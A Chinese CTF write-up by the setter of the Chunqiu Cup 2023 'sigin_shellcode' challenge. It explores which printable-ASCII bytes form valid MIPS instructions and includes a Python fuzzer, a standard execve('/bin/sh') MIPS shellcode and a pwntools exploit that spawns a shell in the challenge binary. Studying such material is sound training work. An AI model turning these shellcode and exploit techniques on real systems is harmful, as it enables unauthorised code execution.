# 从春秋杯sigin_shellcode到mips可见字符组合指令的探索

> 原文: https://www.ctfiot.com/119807.html
> ID: 119807

前言
在本次2023年春秋杯春季赛上，笔者出了sigin_shellcode这题，比较简单异构pwn，希望各位师傅玩得开心的同时也能学到一点知识:)

出题的想法是：在这么多shellcode题目中，有见过很多种类型的shellcode，但笔者从未见过通用的可见字符的mips_shellcode。所以想在出题的同时，来探索一番为何通用的可见字符的mips_shellcode并不存在。

writeup在文章末尾，笔者水平有限，如有疏误请各位斧正。

mips一共有32个寄存器，编号为$0至$31

另外还有两个特殊的寄存器HI、LO

寄存器名
别名
用途

$0
$zero
静态常量0

$1
$at
保留给汇编器

3

v1
存放函数调用的返回值

7

a3
函数或系统调用的参数

15

t7
临时寄存器

23

s7
保存寄存器（一般用于保存调用者函数的现场）

25

t9
临时寄存器

$28
$gp
全局指针

$29
$sp
堆栈指针

$30
$fp
帧指针

$31
$ra
存放返回地址

HI LO
无
用于存储乘法和除法操作的结果

MIPS 指令集架构使用固定长度的 32 位（4 字节）指令。根据指令的类型和功能，MIPS 指令可以分为三种基本格式：R 类型（Register），I 类型（Immediate）和 J 类型（Jump）。

顾名思义，R型指令主要用于寄存器之间的算数、逻辑与移位操作

指令格式：

opcode：操作码，用于指示指令类型。对于R类型指令，opcode始终为0

rs：源寄存器1

rt：源寄存器2

rd：目标寄存器，用于存储操作结果

shamt：位移量，用于移位操作

funct：功能码，用于指定特定的操作，如加法、减法等

R型指令的区分实际上是通过funct来进行的。

I型指令主要用于支持立即数操作，如算术、逻辑操作、加载/存储操作以及条件分支。

指令格式：

opcode：操作码

rs：源寄存器

rt：目标寄存器

immediate：立即数，可以是有符号或无符号数

J型指令主要用于实现无条件跳转。

指令格式：

opcode：操作码

address：跳转目标地址。为了计算实际的跳转地址，这个 26 位值会左移 2 位（因为 MIPS 指令地址总是 4 字节对齐的），然后与当前指令地址的高 4 位拼接。

先来看看所有可见字符能组合成一些什么指令。

根据ASCII码表，可以得知所有的可见字符（不包含空格）的范围是[0x21,0x7e]

I型指令一般由6bits opcode与5bits 源寄存器（rs）、5bits 目标寄存器（rt）还有16bits 立即数组成

但有一些特殊的 I 型指令在构成上有一些变化，例如不使用 rt 字段或rs字段。这些我将分开fuzz。

获取每个可见字符的二进制（8bits表示）

获取之后，先不考虑rs（源寄存器）、rt（目标寄存器）与立即数，直接构造指令来查看能有那些指令能用。

所有可用的I型指令保存在I.txt中。

I.txt去重之后的结果

注意结尾的jalx是J型指令，因为opcode都是6bits，所以可以fuzz出来。

经过测试，不存在rs为0的情况，故不考虑该情况。

经过测试，存在rt为0的情况，因为rt在第二个可见字符上，所以所有当前可用的指令都可以存在rt为0的情况。

还是使用一般I型fuzz函数，只是将rt置0。将得到的结果与一般的指令用WinMerge进行对比。

beqzl与 beqz的区别（不是beql）

在上面给出的例子中，如果beqzl判断成立，也就是$t0等于0，那么它会执行分支延迟槽里的指令（sw $t1, 0($t1)），而如果beqzl判断不成立，则不会执行延迟槽内的指令。beqz无论真假都会执行延迟槽里的语句

beql：两个寄存器相等时进行跳转

bnezl与bnel的区别类似于beqzl与 beqz的区别。

bnezl：当rs不为0时，跳转到当前指令地址+offset（就是指令最后的操作数）所指向的地址。判断条件为真时才执行延迟槽指令。

bnel：当两个寄存器不相等时，跳转到地址+offset所指向的地址。无论判断条件真假都会执行延迟槽指令。

blezl：当rs的值小于等于0时，跳转到当前指令地址+offset（就是指令最后的操作数）所指向的地址。判断条件为真时才执行延迟槽指令。

bgtzl：当rs的值大于等于0时，跳转到当前指令地址+offset（就是指令最后的操作数）所指向的地址。判断条件为真时才执行延迟槽指令。

总结目前能用的I型指令：

对应能用的源寄存器与目标寄存器，可用下文给出的脚本得出，结果在result.txt中。

J型指令由 6bits opcode与26bits 立即数组成

经过上面的fuzz，就只有jalx一个能用。

jalx：执行完延迟槽指令之后，将立即数左移两位作为地址进行跳转并更改指令集架构为microMIPS32 或 MIPS16e

jalx 指令在 Release 6 版本中已被移除，如果处理器不支持 microMIPS 基本架构或 MIPS16e ASE（Application Specific Extension），则会触发保留指令异常。

R型指令的opcode必须是0，很显然在可见字符的范围内并没有前6bits都为0的情况。

mips执行一次简单的syscall调用只需如下步骤：

首先将参数放入$a0-$a3，多出来的参数要放到栈上

将系统调用号放入$v0

执行syscall

再来看看通用的shellcode，execve('/bin/sh',0,0)系统调用

就目前能用的指令与寄存器来说，除了少数的指令，类似andi，slti等能给a0和a1置零之外，这些指令并不能完成系统调用功能。

综上所述，基本上能用的大都是I型指令。只用这些指令想实现系统调用shellcode基本上是不可能的（更何况没有syscall）

最后给出fuzz脚本

运行题目：

调试题目：

在另一个shell中：

如此即可进行调试，接下来看看题解。

main函数

菜单共三个选项：

下一层

退出

商店

先看看第一个选项，基本逻辑是每次都会执行一个get_coin函数直到到达100层执行battle函数

get_coin函数中间有一段伪代码没法看，但可以通过上下文以及程序运行时的交互猜测出是输入与当前层数有关的伪随机数

在每一层输入随机数之后到达100层进入battle函数。它的逻辑是，先有一个随时间变化的coin，它的结果只有1或者0（因为对2取余了），如果等于1的话是肯定会退出的，如果等于0且攻击力ATK大于等于2751的话就能获得一个写shellcode的机会。

要想获得大于等于2751的ATK，只需要在进入100层前进入shopping函数购买武器即可，所给到的coin是刚好够的

在执行我们输入的shellcode之前，usefultools函数已经将函数调用的其他部分布置好了，我们只需要用可见字符组合指令将a0 a1置0即可获得一个shell

exp：

关于白名单检测处的strlen，一开始写源码时并未意识到，到后面搭建完了题目环境再做一遍的时候发现了，但是我懒得再去打包docker了:v

然后就是果不其然被各位师傅打爆了…

非预期直接调用li指令让a0与a1即可，因为00截断能绕过strlen检测。

https://valeeraz.github.io/2020/05/08/architecture-mips/

https://wololo.net/talk/viewtopic.php?t=12427

https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf

http://www.w3cbank.org/See_MIPS_Run-2nd_edition-Chinese-All-201412.pdf

http://hades.mech.northwestern.edu/images/1/16/MIPS32_Architecture_Volume_II-A_Instruction_Set.pdf

https://chat.openai.com/

CTF大本营练习链接：

https://www.ichunqiu.com/competition

春秋杯网络安全联赛将持续打造网络安全新社区，希望更多参赛选手通过比赛结识志同道合的朋友以及交流经验和技巧，欢迎更多伙伴加入春秋杯赛事宇宙，期待大家再次相聚，继续挑战新高度，探索更广阔的宇宙星河！

春秋杯赛事交流QQ群：277328440；

春秋杯赛事交流群（微信群），进群请先加楠辞微信：h40215_


```
[ 6 bits  ][ 5 bits  ][ 5 bits  ][ 5 bits  ][ 5 bits  ][ 6 bits  ]
[  000000 ][  00000  ][  00000  ][  00000  ][  00000  ][ 000000  ]
[ opcode  ][   rs    ][   rt    ][   rd    ][  shamt  ][  funct  ]
```



```
[ 6 bits  ][ 5 bits  ][ 5 bits  ][    16 bits     ]
[ 000000  ][  00000  ][  00000  ][0000000000000000]
[ opcode  ][  rs     ][  rt     ][   immediate    ]
```



```
[ 6 bits  ][         26 bits          ]
[ 000000  ][00000000000000000000000000]
[ opcode  ][        address           ]
```



```
def get_all_opcode():
    for i in range(0x21, 0x7e + 1):
        bin_i = bin(i)[2:]
        if len(bin_i) == 6:
            bin_i = "00"+bin_i
            opcode.append(bin_i)
        else:
            bin_i = "0"+bin_i
            opcode.append(bin_i)
    print(opcode)
    info("Function get_all_opcode Over")
```



```
def find_I_instruction(rs,rt,savefile):
    # rs = "00011" # 3
    # rt = "00010" # 2
    imm = "1000000000000001" # 0x8001
    f = open(savefile,"a+")
    for i in opcode:
        chr_i = chr(int(i,2))
        instruction = i[:6] + rs + rt + imm
        # print(len(instruction))
        # pause()
        int_value = int(instruction, 2)
        num_bytes = (len(instruction) + 7) // 8
        byte_data = int_value.to_bytes(num_bytes, byteorder='little')
        with open("test_bin", 'wb') as e:
            e.write(byte_data)
            e.close()
        command = "mipsel-linux-gnu-objdump -D -b binary -m mips -EL test_bin"
        f.write(chr_i+"_"+hex(int(i,2))+"_"+i[:6])
        f.write(run_command(command)+"n")
    f.close()
    info("Function find_I_instruction Over")
```



```
!_0x21_001000
0: 20628001  addi v0,v1,-32767

"_0x22_001000
0: 20628001  addi v0,v1,-32767

#_0x23_001000
0: 20628001  addi v0,v1,-32767

$_0x24_001001
0: 24628001  addiu v0,v1,-32767

%_0x25_001001
0: 24628001  addiu v0,v1,-32767

&_0x26_001001
0: 24628001  addiu v0,v1,-32767

'_0x27_001001
0: 24628001  addiu v0,v1,-32767

(_0x28_001010
0: 28628001  slti v0,v1,-32767

)_0x29_001010
0: 28628001  slti v0,v1,-32767

*_0x2a_001010
0: 28628001  slti v0,v1,-32767

+_0x2b_001010
0: 28628001  slti v0,v1,-32767

,_0x2c_001011
0: 2c628001  sltiu v0,v1,-32767

-_0x2d_001011
0: 2c628001  sltiu v0,v1,-32767

._0x2e_001011
0: 2c628001  sltiu v0,v1,-32767

/_0x2f_001011
0: 2c628001  sltiu v0,v1,-32767

0_0x30_001100
0: 30628001  andi v0,v1,0x8001

# ......太长不放出来了
```



```
def find_I_rs():
    for i in opcode:
        for j in opcode:  
            rs = i[6:]+j[:3]
            print("RS "+str(int(rs,2)))
            if rs=="00000":
                print("Get")
                pause()
    info("Function find_I_rs Over")
```



```
def find_I_rt():
    for i in opcode:
        rt = i[3:]
        print("RT "+str(int(rt,2)))
        if rt=="00000":
            print("Get")
            pause()
    info("Function find_I_rt Over")
```



```
beqzl $t0, local_random # $t0=0 则跳转到 local_random
sw $t1, 0($t1) # 延迟槽
lw  $a0, 0($t1)
```



```
addi # 0x21 - 0x23
addiu # 0x24 - 0x27
slti # 0x28 - 0x2b
sltiu # 0x2c - 0x2f
andi # 0x30 - 0x33
ori # 0x34 - 0x37
xori # 0x38 - 0x3b
beql # 0x50 - 0x53
bnel # 0x54 - 0x57
daddi # 0x60 - 0x64
daddiu # 0x64 - 0x67
ldl # 0x68 - 0x6b
ldr # 0x6c - 0x6f
beqzl(rt=0) # 0x50 - 0x53
bnezl(rt=0) # 0x54 - 0x57
blezl(rt=0) # 0x58 - 0x5b
bgtzl(rt=0) # 0x5c - 0x5f
```



```
# 将//bin/sh 放入$a0 $a1
li $a0, 0x69622f2f
li $a1, 0x68732f6e

# 将$a0与$a1的值分别存储到栈上
sw $a0, -8($sp)
sw $a1, -4($sp)

# 将//bin/sh字符串的地址放入$a0
addiu $a0, $sp, -8

# $a1 $a2置零
li $a1, 0
li $a2, 0

# execve系统调用号4011
li $v0, 4011
syscall
```



```
# merge函数将给出形如下面四行的result.txt
# !! 0x21 RS Num: 9 RT 0x21 1
# !" 0x21 RS Num: 9 RT 0x22 2
# !# 0x21 RS Num: 9 RT 0x23 3
# !$ 0x21 RS Num: 9 RT 0x24 4
# 字符 第一个字符的十六进制 rs寄存器号 第二个字符的十六进制 rt寄存器号

import subprocess
from itertools import product
from pwn import *

def run_command(command):
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)
    return result.stdout

def get_all_opcode():
    for i in range(0x21, 0x7e + 1):
        bin_i = bin(i)[2:]
        if len(bin_i) == 6:
            bin_i = "00"+bin_i
            opcode.append(bin_i)
        else:
            bin_i = "0"+bin_i
            opcode.append(bin_i)
    print(opcode)
    info("Function get_all_opcode Over")

def find_I_instruction(rs,rt,savefile):
    # rs = "00011" # 3
    # rt = "00010" # 2
    imm = "1000000000000001" # 0x8001
    f = open(savefile,"a+")
    for i in opcode:
        chr_i = chr(int(i,2))
        instruction = i[:6] + rs + rt + imm
        # print(len(instruction))
        # pause()
        int_value = int(instruction, 2)
        num_bytes = (len(instruction) + 7) // 8
        byte_data = int_value.to_bytes(num_bytes, byteorder='little')
        with open("test_bin", 'wb') as e:
            e.write(byte_data)
            e.close()
        command = "mipsel-linux-gnu-objdump -D -b binary -m mips -EL test_bin"
        f.write(chr_i+"_"+hex(int(i,2))+"_"+i[:6])
        f.write(run_command(command)+"n")
    f.close()
    info("Function find_I_instruction Over")

def find_I_rs():
    f = open("rs.txt","a+")
    for i in opcode:
        for j in opcode:
            hex_i = hex(int(i,2)) # 第一个字符的十六进制，方便查询操作指令
            print(chr(int(i,2))+chr(int(j,2))+" "+hex_i) # 前两个字符
            rs = i[6:]+j[:3]
            print("RS "+"Num: "+str(int(rs,2))+"n")
            f.write(chr(int(i,2))+chr(int(j,2))+" "+hex_i+" "+"RS "+"Num: "+str(int(rs,2))+"nn")
            # if rs=="00000":
            #     print("Get")
            #     pause()
    f.close()
    info("Function find_I_rs Over")

# rt是第二个可见字符剩余的部分
def find_I_rt():
    f = open('rt.txt',"a+")
    for i in opcode:
        print(chr(int(i,2))) # 第二个字符
        hex_i = hex(int(i,2))
        rt = i[3:]
        print("RT "+hex_i+" "+str(int(rt,2))+"n")
        f.write(chr(int(i,2))+" "+"RT "+hex_i+" "+str(int(rt,2))+"nn")
        # if rt=="00000":
        #     print("Get")
        #     pause()
    f.close()
    info("Function find_I_rt Over")

def find_I_imm():
    for i in opcode:
        for j in opcode:
            print(i+j)

def merge():
    rt = {}
    with open("rt.txt", "r") as f:
        for line in f:
            if line=="n":
                continue
            else:
                rt[line.split( )[0]] = line.split( )[1]+" "+line.split( )[2]+" "+line.split( )[3]
        # print(rt)
        f.close()

    rt_list = []
    with open("rs.txt", "r") as f:
        for line in f:
            if line=="n":
                continue
            else:
                for key in rt:
                    if line[1:2]==key:
                        rt_list.append(line.replace("n"," ") + rt[key])
                        # print(line.replace("n"," ") + rt[key])
        print(rt_list)
        f.close()
    with open("result.txt","a+") as f:
        for i in rt_list:
            f.write(i+"n")
        f.close()  

if __name__ == "__main__":
    opcode = []
    get_all_opcode()
    # find_I_instruction(rs='00011',rt='00010',savefile="I.txt")
    # find_I_rs()
    # find_I_rt()
    # find_I_instruction(rs='00011',rt='00000',savefile="I_spec_rt.txt")
    # find_I_imm()

    merge()
```



```
gdb-multiarch
set arch mips
target remote :1234
file /home/pwn/Desktop/test/pwn # 我没去除调试符号，所以可以加载
```



```
from pwn import *
context(os = 'linux', arch = 'mips', log_level = 'debug')
# file_path = './test'

p = process(b"""
    qemu-mipsel-static -L ./ 
    ./test """, shell = True)

# p = remote("127.0.0.1",9999)

def down():
    p.sendlineafter("Go>",str(1))

list = ['0', '1', '2', '1', '4', '5', '4', '5', '8', '9', '8', '5', '5', '11', '14', '5', '16', '17', '5', '9', '11', '19', '3', '5', '4', '5', '17', '25', '14', '29', '30', '5', '8', '33', '4', '17', '32', '5', '5', '29', '33', '11', '0', '41', '44', '3', '6', '5', '46', '29', '50', '5', '47', '17', '19', '53', '5', '43', '52', '29', '32', '61', '53', '5', '44', '41', '60', '33', '26', '39', '1', '53', '52', '69', '29', '5', '74', '5', '29', '69', '44', '33', '36', '53', '84', '43', '14', '85', '81', '89', '18', '49', '92', '53', '24', '5', '93', '95','8',"29"]

for i in range(98):
    down()
    p.sendlineafter("How much do you want?n",list[i])

p.sendlineafter("Go>",str(3))
p.sendlineafter("> ",str(2))
down()
p.sendlineafter("How much do you want?n","8")
p.sendlineafter("Go>",str(3))
p.sendlineafter("> ",str(3))
p.sendlineafter("Go>",str(1))
p.sendlineafter("How much do you want?n","29")
p.sendafter("Shellcode > ","00%)00&)");

p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/4-1686307899.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/7-1686307899.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1686307899.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1686307900.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/10-1686307900.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/9-1686307900.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/8-1686307900.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/9-1686307901.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/7-1686307901.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1686307901.png)